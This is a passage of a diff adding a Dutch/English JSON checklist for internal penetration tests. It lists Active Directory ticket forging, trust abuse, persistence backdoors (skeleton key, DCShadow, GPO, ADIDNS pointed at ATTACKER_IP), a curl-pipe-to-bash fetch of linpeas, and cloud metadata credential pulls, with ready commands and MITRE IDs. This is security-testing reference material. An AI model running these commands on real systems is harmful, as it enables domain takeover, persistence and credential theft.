+              "description": "Maak een Silver Ticket voor toegang tot een specifieke service.",
+              "en_description": "Create a Silver Ticket for access to a specific service.",
+              "commands": [
+                "kerberos::golden /user:Administrator /domain:DOMAIN /sid:SID /target:TARGET /service:SERVICE /rc4:HASH /ptt"
+              ],
+              "command_refs": [
+                "kerb_silver_ticket"
+              ],
+              "finding_refs": [
+                "Silver Ticket Attack"
+              ],
+              "tools": [
+                "mimikatz",
+                "rubeus"
+              ],
+              "mitre_attack": [
+                "T1558.002"
+              ]
+            },
+            {
+              "id": "int_domdom_004",
+              "title": "Diamond Ticket",
+              "en_title": "Diamond Ticket",
+              "description": "Maak een Diamond Ticket door een echt TGT te modificeren.",
+              "en_description": "Create a Diamond Ticket by modifying a real TGT.",
+              "commands": [
+                "Rubeus.exe diamond /krbkey:HASH /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt"
+              ],
+              "command_refs": [
+                "kerb_diamond_ticket"
+              ],
+              "finding_refs": [
+                "Diamond Ticket Attack"
+              ],
+              "tools": [
+                "rubeus"
+              ],
+              "mitre_attack": [
+                "T1558.001"
+              ]
+            },
+            {
+              "id": "int_domdom_005",
+              "title": "Resource-Based Constrained Delegation (RBCD)",
+              "en_title": "Resource-Based Constrained Delegation (RBCD)",
+              "description": "Misbruik RBCD door msDS-AllowedToActOnBehalfOfOtherIdentity aan te passen.",
+              "en_description": "Abuse RBCD by modifying msDS-AllowedToActOnBehalfOfOtherIdentity.",
+              "commands": [
+                "Set-DomainObject -Identity TARGET$ -Set @{msDS-AllowedToActOnBehalfOfOtherIdentity=$sd}"
+              ],
+              "command_refs": [
+                "kerb_rbcd"
+              ],
+              "finding_refs": [
+                "RBCD Abuse"
+              ],
+              "tools": [
+                "powermad",
+                "rubeus",
+                "impacket"
+              ],
+              "mitre_attack": [
+                "T1550.003"
+              ]
+            },
+            {
+              "id": "int_domdom_006",
+              "title": "Child-to-parent trust escalatie",
+              "en_title": "Child to Parent Trust Escalation",
+              "description": "Escaleer van child-domein naar parent-domein via trust-relatie.",
+              "en_description": "Escalate from child domain to parent domain via trust relationship.",
+              "commands": [
+                "kerberos::golden /user:Administrator /domain:CHILD.DOMAIN /sid:CHILD_SID /sids:PARENT_SID-519 /krbtgt:HASH /ptt"
+              ],
+              "command_refs": [
+                "ad_trust_child_to_parent"
+              ],
+              "finding_refs": [
+                "Trust Escalation"
+              ],
+              "tools": [
+                "mimikatz",
+                "rubeus"
+              ],
+              "mitre_attack": [
+                "T1134.005"
+              ]
+            },
+            {
+              "id": "int_domdom_007",
+              "title": "Cross-forest trust abuse",
+              "en_title": "Cross-Forest Trust Abuse",
+              "description": "Misbruik cross-forest trusts voor toegang tot resources in andere forests.",
+              "en_description": "Abuse cross-forest trusts for access to resources in other forests.",
+              "commands": [
+                "Get-DomainTrust -Domain FOREIGN.DOMAIN",
+                "Get-DomainForeignGroupMember -Domain FOREIGN.DOMAIN"
+              ],
+              "command_refs": [
+                "ad_trust_cross_forest"
+              ],
+              "finding_refs": [
+                "Cross-Forest Trust Abuse"
+              ],
+              "tools": [
+                "powerview",
+                "rubeus"
+              ],
+              "mitre_attack": [
+                "T1482"
+              ]
+            },
+            {
+              "id": "int_domdom_008",
+              "title": "PAM trust",
+              "en_title": "PAM Trust",
+              "description": "Misbruik Privileged Access Management trust voor shadow principal toegang.",
+              "en_description": "Abuse Privileged Access Management trust for shadow principal access.",
+              "commands": [],
+              "command_refs": [
+                "ad_pam_trust"
+              ],
+              "finding_refs": [
+                "PAM Trust Abuse"
+              ],
+              "tools": [
+                "powerview"
+              ],
+              "mitre_attack": [
+                "T1134.005"
+              ]
+            },
+            {
+              "id": "int_domdom_009",
+              "title": "Trust account abuse",
+              "en_title": "Trust Account Abuse",
+              "description": "Misbruik trust-accounts voor authenticatie tussen domeinen.",
+              "en_description": "Abuse trust accounts for authentication between domains.",
+              "commands": [],
+              "command_refs": [
+                "ad_trust_account"
+              ],
+              "finding_refs": [
+                "Trust Account Abuse"
+              ],
+              "tools": [
+                "mimikatz",
+                "impacket"
+              ],
+              "mitre_attack": [
+                "T1134.005"
+              ]
+            },
+            {
+              "id": "int_domdom_010",
+              "title": "Entra Connect abuse",
+              "en_title": "Entra Connect Abuse",
+              "description": "Misbruik Azure AD Connect / Entra Connect voor credential extractie.",
+              "en_description": "Abuse Azure AD Connect / Entra Connect for credential extraction.",
+              "commands": [],
+              "command_refs": [
+                "ad_entra_connect"
+              ],
+              "finding_refs": [
+                "Entra Connect Credential Extraction"
+              ],
+              "tools": [
+                "adfsdump"
+              ],
+              "mitre_attack": [
+                "T1552"
+              ]
+            },
+            {
+              "id": "int_domdom_011",
+              "title": "Sapphire Ticket",
+              "en_title": "Sapphire Ticket",
+              "description": "Maak een Sapphire Ticket: een Diamond Ticket met S4U2Self PAC-data voor stealthier aanval.",
+              "en_description": "Create a Sapphire Ticket: a Diamond Ticket with S4U2Self PAC data for stealthier attack.",
+              "commands": [
+                "Rubeus.exe diamond /krbkey:HASH /ticketuser:Administrator /ticketuserid:500 /groups:512 /tgtdeleg /ptt"
+              ],
+              "command_refs": [
+                "kerb_sapphire_ticket"
+              ],
+              "finding_refs": [
+                "Sapphire Ticket Attack"
+              ],
+              "tools": [
+                "rubeus",
+                "impacket"
+              ],
+              "mitre_attack": [
+                "T1558.001"
+              ]
+            },
+            {
+              "id": "int_domdom_012",
+              "title": "Forest pivot",
+              "en_title": "Forest Pivot",
+              "description": "Pivot naar een ander forest via trust-tickets, SID history of ADCS cross-forest enrollment.",
+              "en_description": "Pivot to another forest via trust tickets, SID history or ADCS cross-forest enrollment.",
+              "commands": [
+                "Get-DomainTrust -Domain FOREIGN.DOMAIN",
+                "Rubeus.exe asktgt /user:TRUST_ACCOUNT$ /rc4:HASH /domain:FOREIGN.DOMAIN /dc:FOREIGN_DC /ptt"
+              ],
+              "command_refs": [
+                "ad_forest_pivot"
+              ],
+              "finding_refs": [
+                "Cross-Forest Compromise"
+              ],
+              "tools": [
+                "rubeus",
+                "powerview",
+                "impacket"
+              ],
+              "mitre_attack": [
+                "T1134.005",
+                "T1482"
+              ]
+            },
+            {
+              "id": "int_domdom_013",
+              "title": "SCCM site takeover",
+              "en_title": "SCCM Site Takeover",
+              "description": "Escaleer naar SCCM site server via site promotion, NTLM relay of admin role abuse.",
+              "en_description": "Escalate to SCCM site server via site promotion, NTLM relay or admin role abuse.",
+              "commands": [
+                "SharpSCCM.exe admin",
+                "sccmhunter admin -u USER -p PASS -ip TARGET"
+              ],
+              "command_refs": [
+                "ad_sccm_takeover"
+              ],
+              "finding_refs": [
+                "SCCM Site Server Compromise"
+              ],
+              "tools": [
+                "sharpsccm",
+                "sccmhunter"
+              ],
+              "mitre_attack": [
+                "T1072"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "int_persist",
+          "title": "Persistentie & Impact",
+          "items": [
+            {
+              "id": "int_persist_001",
+              "title": "Skeleton Key",
+              "en_title": "Skeleton Key",
+              "description": "Installeer een skeleton key op de domeincontroller voor universele toegang.",
+              "en_description": "Install a skeleton key on the domain controller for universal access.",
+              "commands": [
+                "misc::skeleton"
+              ],
+              "command_refs": [
+                "persist_skeleton_key"
+              ],
+              "finding_refs": [
+                "Skeleton Key Persistence"
+              ],
+              "tools": [
+                "mimikatz"
+              ],
+              "mitre_attack": [
+                "T1556.001"
+              ]
+            },
+            {
+              "id": "int_persist_002",
+              "title": "AdminSDHolder",
+              "en_title": "AdminSDHolder",
+              "description": "Misbruik AdminSDHolder voor persistente privileged toegang.",
+              "en_description": "Abuse AdminSDHolder for persistent privileged access.",
+              "commands": [
+                "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=local' -PrincipalIdentity USER -Rights All"
+              ],
+              "command_refs": [
+                "persist_adminsdholder"
+              ],
+              "finding_refs": [
+                "AdminSDHolder Persistence"
+              ],
+              "tools": [
+                "powerview"
+              ],
+              "mitre_attack": [
+                "T1098"
+              ]
+            },
+            {
+              "id": "int_persist_003",
+              "title": "Custom SSP",
+              "en_title": "Custom SSP",
+              "description": "Registreer een custom Security Support Provider voor credential logging.",
+              "en_description": "Register a custom Security Support Provider for credential logging.",
+              "commands": [
+                "misc::memssp"
+              ],
+              "command_refs": [
+                "persist_custom_ssp"
+              ],
+              "finding_refs": [
+                "Custom SSP Persistence"
+              ],
+              "tools": [
+                "mimikatz"
+              ],
+              "mitre_attack": [
+                "T1547.005"
+              ]
+            },
+            {
+              "id": "int_persist_004",
+              "title": "DSRM",
+              "en_title": "DSRM",
+              "description": "Misbruik Directory Services Restore Mode voor backdoor-toegang tot de DC.",
+              "en_description": "Abuse Directory Services Restore Mode for backdoor access to the DC.",
+              "commands": [
+                "Set-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' -Name 'DsrmAdminLogonBehavior' -Value 2"
+              ],
+              "command_refs": [
+                "persist_dsrm"
+              ],
+              "finding_refs": [
+                "DSRM Persistence"
+              ],
+              "tools": [
+                "powershell"
+              ],
+              "mitre_attack": [
+                "T1003"
+              ]
+            },
+            {
+              "id": "int_persist_005",
+              "title": "WMI event subscription",
+              "en_title": "WMI Event Subscription",
+              "description": "Maak WMI event subscriptions voor automatische code-uitvoering.",
+              "en_description": "Create WMI event subscriptions for automatic code execution.",
+              "commands": [],
+              "command_refs": [
+                "persist_wmi_event"
+              ],
+              "finding_refs": [
+                "WMI Persistence"
+              ],
+              "tools": [
+                "powershell",
+                "wmic"
+              ],
+              "mitre_attack": [
+                "T1546.003"
+              ]
+            },
+            {
+              "id": "int_persist_006",
+              "title": "Security descriptors",
+              "en_title": "Security Descriptors",
+              "description": "Wijzig security descriptors voor persistente remote toegang zonder admin-rechten.",
+              "en_description": "Modify security descriptors for persistent remote access without admin rights.",
+              "commands": [
+                "Set-RemoteWMI -UserName USER -Namespace 'root\\cimv2' -ComputerName TARGET"
+              ],
+              "command_refs": [
+                "persist_security_descriptors"
+              ],
+              "finding_refs": [
+                "Security Descriptor Modification"
+              ],
+              "tools": [
+                "powershell"
+              ],
+              "mitre_attack": [
+                "T1222.001"
+              ]
+            },
+            {
+              "id": "int_persist_007",
+              "title": "COM hijacking",
+              "en_title": "COM Hijacking",
+              "description": "Misbruik COM-objectregistratie voor persistente code-uitvoering.",
+              "en_description": "Abuse COM object registration for persistent code execution.",
+              "commands": [],
+              "command_refs": [
+                "persist_com_hijack"
+              ],
+              "finding_refs": [
+                "COM Hijacking Persistence"
+              ],
+              "tools": [
+                "powershell"
+              ],
+              "mitre_attack": [
+                "T1546.015"
+              ]
+            },
+            {
+              "id": "int_persist_008",
+              "title": "Network provider",
+              "en_title": "Network Provider",
+              "description": "Registreer een malafide network provider DLL voor credential harvesting.",
+              "en_description": "Register a rogue network provider DLL for credential harvesting.",
+              "commands": [],
+              "command_refs": [
+                "persist_network_provider"
+              ],
+              "finding_refs": [
+                "Network Provider Persistence"
+              ],
+              "tools": [
+                "powershell"
+              ],
+              "mitre_attack": [
+                "T1556"
+              ]
+            },
+            {
+              "id": "int_persist_009",
+              "title": "Data-toegang beoordeling",
+              "en_title": "Data Access Assessment",
+              "description": "Beoordeel de toegang tot gevoelige bedrijfsdata vanuit de verkregen positie.",
+              "en_description": "Assess access to sensitive business data from the obtained position.",
+              "commands": [],
+              "command_refs": [],
+              "finding_refs": [
+                "Sensitive Data Accessible"
+              ],
+              "tools": [],
+              "mitre_attack": [
+                "T1530"
+              ]
+            },
+            {
+              "id": "int_persist_010",
+              "title": "Golden Certificate",
+              "en_title": "Golden Certificate",
+              "description": "Exporteer de CA private key en genereer certificaten voor willekeurige gebruikers.",
+              "en_description": "Export the CA private key and generate certificates for arbitrary users.",
+              "commands": [
+                "SharpDPAPI.exe certificates /machine",
+                "certipy forge -ca-pfx CA.pfx -upn admin@DOMAIN -subject 'CN=Administrator'"
+              ],
+              "command_refs": [
+                "persist_golden_cert"
+              ],
+              "finding_refs": [
+                "Golden Certificate Persistence"
+              ],
+              "tools": [
+                "certipy",
+                "sharpdpapi",
+                "forgecert"
+              ],
+              "mitre_attack": [
+                "T1649",
+                "T1553.004"
+              ]
+            },
+            {
+              "id": "int_persist_011",
+              "title": "DCShadow",
+              "en_title": "DCShadow",
+              "description": "Registreer een rogue DC om wijzigingen direct in AD te repliceren zonder detectie.",
+              "en_description": "Register a rogue DC to replicate changes directly into AD without detection.",
+              "commands": [
+                "lsadump::dcshadow /object:TARGET /attribute:ATTR /value:VALUE",
+                "lsadump::dcshadow /push"
+              ],
+              "command_refs": [
+                "persist_dcshadow"
+              ],
+              "finding_refs": [
+                "DCShadow Persistence"
+              ],
+              "tools": [
+                "mimikatz"
+              ],
+              "mitre_attack": [
+                "T1207"
+              ]
+            },
+            {
+              "id": "int_persist_012",
+              "title": "SID History injection",
+              "en_title": "SID History Injection",
+              "description": "Injecteer een privileged SID in het sIDHistory-attribuut van een gebruiker voor persistente toegang.",
+              "en_description": "Inject a privileged SID into a user's sIDHistory attribute for persistent access.",
+              "commands": [
+                "lsadump::dcshadow /object:USER /attribute:sIDHistory /value:SID"
+              ],
+              "command_refs": [
+                "persist_sid_history"
+              ],
+              "finding_refs": [
+                "SID History Injection"
+              ],
+              "tools": [
+                "mimikatz",
+                "impacket"
+              ],
+              "mitre_attack": [
+                "T1134.005"
+              ]
+            },
+            {
+              "id": "int_persist_013",
+              "title": "GPO backdoor",
+              "en_title": "GPO Backdoor",
+              "description": "Maak of wijzig een GPO voor persistente code-executie op domein-computers.",
+              "en_description": "Create or modify a GPO for persistent code execution on domain computers.",
+              "commands": [
+                "SharpGPOAbuse.exe --AddComputerTask --TaskName 'persist' --Author 'DOMAIN\\\\admin' --Command 'cmd.exe' --Arguments '/c PAYLOAD' --GPOName 'Default Domain Policy'"
+              ],
+              "command_refs": [
+                "persist_gpo_backdoor"
+              ],
+              "finding_refs": [
+                "GPO Persistence"
+              ],
+              "tools": [
+                "sharpgpoabuse",
+                "pygpoabuse"
+              ],
+              "mitre_attack": [
+                "T1484.001"
+              ]
+            },
+            {
+              "id": "int_persist_014",
+              "title": "Machine account abuse",
+              "en_title": "Machine Account Abuse",
+              "description": "Maak rogue machine-accounts via ms-DS-MachineAccountQuota voor persistence of RBCD.",
+              "en_description": "Create rogue machine accounts via ms-DS-MachineAccountQuota for persistence or RBCD.",
+              "commands": [
+                "New-MachineAccount -MachineAccount FAKE -Password $(ConvertTo-SecureString 'Pass1!' -AsPlainText -Force)",
+                "addcomputer.py -computer-name FAKE$ -computer-pass Pass1! DOMAIN/USER:PASS"
+              ],
+              "command_refs": [
+                "persist_machine_account"
+              ],
+              "finding_refs": [
+                "MachineAccountQuota Abuse"
+              ],
+              "tools": [
+                "powermad",
+                "impacket"
+              ],
+              "mitre_attack": [
+                "T1136.002"
+              ]
+            },
+            {
+              "id": "int_persist_015",
+              "title": "ADIDNS timebomb",
+              "en_title": "ADIDNS Timebomb",
+              "description": "Maak wildcard of specifieke ADIDNS-records voor persistente MITM of name-resolution hijacking.",
+              "en_description": "Create wildcard or specific ADIDNS records for persistent MITM or name resolution hijacking.",
+              "commands": [
+                "Invoke-DNSUpdate -DNSType A -DNSName * -DNSData ATTACKER_IP",
+                "dnstool.py -u DOMAIN\\\\USER -p PASS -r *.DOMAIN -a add -d ATTACKER_IP DC"
+              ],
+              "command_refs": [
+                "persist_adidns_timebomb"
+              ],
+              "finding_refs": [
+                "ADIDNS Record Manipulation"
+              ],
+              "tools": [
+                "powermad",
+                "dnstool"
+              ],
+              "mitre_attack": [
+                "T1557.001"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "int_linux",
+          "title": "Linux/Cloud",
+          "items": [
+            {
+              "id": "int_linux_001",
+              "title": "Linux enumeratie",
+              "en_title": "Linux Enumeration",
+              "description": "Voer uitgebreide enumeratie uit op Linux-systemen.",
+              "en_description": "Perform comprehensive enumeration on Linux systems.",
+              "commands": [
+                "curl http://IP/linpeas.sh | bash",
+                "id && hostname && uname -a"
+              ],
+              "command_refs": [
+                "enum_linux"
+              ],
+              "finding_refs": [],
+              "tools": [
+                "linpeas"
+              ],
+              "mitre_attack": [
+                "T1082"
+              ]
+            },
+            {
+              "id": "int_linux_002",
+              "title": "SUID binaries",
+              "en_title": "SUID Binaries",
+              "description": "Zoek naar misbruikbare SUID/SGID binaries voor privilege escalatie.",
+              "en_description": "Search for abusable SUID/SGID binaries for privilege escalation.",
+              "commands": [
+                "find / -perm -4000 -type f 2>/dev/null",
+                "find / -perm -2000 -type f 2>/dev/null"
+              ],
+              "command_refs": [
+                "privesc_linux_suid"
+              ],
+              "finding_refs": [
+                "SUID Binary Abuse"
+              ],
+              "tools": [
+                "find",
+                "gtfobins"
+              ],
+              "mitre_attack": [
+                "T1548.001"
+              ]
+            },
+            {
+              "id": "int_linux_003",
+              "title": "Sudo misconfiguratie",
+              "en_title": "Sudo Misconfiguration",
+              "description": "Controleer sudo-configuratie op misbruikbare regels.",
+              "en_description": "Check sudo configuration for abusable rules.",
+              "commands": [
+                "sudo -l",
+                "cat /etc/sudoers"
+              ],
+              "command_refs": [
+                "privesc_linux_sudo"
+              ],
+              "finding_refs": [
+                "Sudo Misconfiguration"
+              ],
+              "tools": [
+                "sudo"
+              ],
+              "mitre_attack": [
+                "T1548.003"
+              ]
+            },
+            {
+              "id": "int_linux_004",
+              "title": "Cron jobs",
+              "en_title": "Cron Jobs",
+              "description": "Analyseer cron jobs op schrijfbare scripts en misbruikbare taken.",
+              "en_description": "Analyze cron jobs for writable scripts and abusable tasks.",
+              "commands": [
+                "cat /etc/crontab",
+                "ls -la /etc/cron.*",
+                "crontab -l"
+              ],
+              "command_refs": [
+                "privesc_linux_cron"
+              ],
+              "finding_refs": [
+                "Writable Cron Job"
+              ],
+              "tools": [],
+              "mitre_attack": [
+                "T1053.003"
+              ]
+            },
+            {
+              "id": "int_linux_005",
+              "title": "SSH agent forwarding",
+              "en_title": "SSH Agent Forwarding",
+              "description": "Misbruik SSH agent forwarding voor toegang tot andere systemen.",
+              "en_description": "Abuse SSH agent forwarding for access to other systems.",
+              "commands": [
+                "ls -la /tmp/ssh-*",
+                "SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.PID ssh-add -l"
+              ],
+              "command_refs": [
+                "linux_ssh_agent"
+              ],
+              "finding_refs": [
+                "SSH Agent Hijacking"
+              ],
+              "tools": [
+                "ssh"
+              ],
+              "mitre_attack": [
+                "T1563.001"
+              ]
+            },
+            {
+              "id": "int_linux_006",
+              "title": "SSH hijacking",
+              "en_title": "SSH Hijacking",
+              "description": "Hijack bestaande SSH-sessies via ControlMaster sockets.",
+              "en_description": "Hijack existing SSH sessions via ControlMaster sockets.",
+              "commands": [
+                "ls -la /tmp/ssh-*",
+                "ssh -S /tmp/ssh-SOCKET USER@TARGET"
+              ],
+              "command_refs": [
+                "linux_ssh_hijack"
+              ],
+              "finding_refs": [
+                "SSH Session Hijacking"
+              ],
+              "tools": [
+                "ssh"
+              ],
+              "mitre_attack": [
+                "T1563.001"
+              ]
+            },
+            {
+              "id": "int_linux_007",
+              "title": "Ansible enumeratie",
+              "en_title": "Ansible Enumeration",
+              "description": "Enumereer Ansible-configuratie voor credentials en managed hosts.",
+              "en_description": "Enumerate Ansible configuration for credentials and managed hosts.",
+              "commands": [
+                "find / -name 'ansible.cfg' 2>/dev/null",
+                "cat /etc/ansible/hosts",
+                "find / -name '*.yml' -path '*/ansible/*' 2>/dev/null"
+              ],
+              "command_refs": [
+                "linux_ansible_enum"
+              ],
+              "finding_refs": [
+                "Ansible Credential Exposure"
+              ],
+              "tools": [
+                "ansible"
+              ],
+              "mitre_attack": [
+                "T1552.001"
+              ]
+            },
+            {
+              "id": "int_linux_008",
+              "title": "Cloud metadata SSRF",
+              "en_title": "Cloud Metadata SSRF",
+              "description": "Test op SSRF naar cloud metadata-endpoints voor credential-extractie.",
+              "en_description": "Test for SSRF to cloud metadata endpoints for credential extraction.",
+              "commands": [
+                "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                "curl -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
+              ],
+              "command_refs": [
+                "web_ssrf_cloud"
+              ],
+              "finding_refs": [
+                "Cloud Metadata Exposure"
+              ],
+              "tools": [
+                "curl"
+              ],
+              "mitre_attack": [
+                "T1552.005"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "int_report",
+          "title": "Rapportage & Cleanup",
+          "items": [
+            {
+              "id": "int_report_001",
+              "title": "Bewijsverzameling",
+              "en_title": "Evidence Collection",
+              "description": "Verzamel en organiseer alle bewijzen van gevonden kwetsbaarheden en aanvalspaden.",
+              "en_description": "Collect and organize all evidence of discovered vulnerabilities and attack paths.",
+              "commands": [],
+              "command_refs": [],
+              "finding_refs": [],
+              "tools": [],
+              "mitre_attack": []
+            },
+            {
+              "id": "int_report_002",
+              "title": "Screenshot documentatie",
+              "en_title": "Screenshot Documentation",
+              "description": "Maak screenshots van alle kwetsbaarheden, aanvalspaden en bereikte doelen.",
+              "en_description": "Take screenshots of all vulnerabilities, attack paths and achieved objectives.",
+              "commands": [],
+              "command_refs": [],
+              "finding_refs": [],
+              "tools": [],
+              "mitre_attack": []
+            },
+            {
+              "id": "int_report_003",
+              "title": "Verwijder gedeployde tools/implants",
+              "en_title": "Cleanup Deployed Tools/Implants",
+              "description": "Verwijder alle geplaatste tools, implants, gebruikers en persistentie-mechanismen.",
+              "en_description": "Remove all placed tools, implants, users and persistence mechanisms.",
+              "commands": [],
+              "command_refs": [],
+              "finding_refs": [],
+              "tools": [],
+              "mitre_attack": []
+            },
+            {
+              "id": "int_report_004",
+              "title": "Verifieer cleanup volledigheid",
+              "en_title": "Verify Cleanup Completeness",
+              "description": "Controleer of alle artefacten, accounts en wijzigingen volledig zijn teruggedraaid.",
+              "en_description": "Verify all artifacts, accounts and changes have been completely reverted.",
+              "commands": [],
+              "command_refs": [],
+              "finding_refs": [],
+              "tools": [],
+              "mitre_attack": []
+            },
+            {
+              "id": "int_report_005",
+              "title": "Rapportgeneratie",
+              "en_title": "Report Generation",
+              "description": "Genereer het eindrapport met alle bevindingen, aanvalspaden, risicoscores en aanbevelingen.",
+              "en_description": "Generate the final report with all findings, attack paths, risk scores and recommendations.",
+              "commands": [],
+              "command_refs": [],
+              "finding_refs": [],
+              "tools": [
+                "pandoc"
+              ],
+              "mitre_attack": []
+            }
+          ]
+        }
+      ]
+    }
+  }
+}
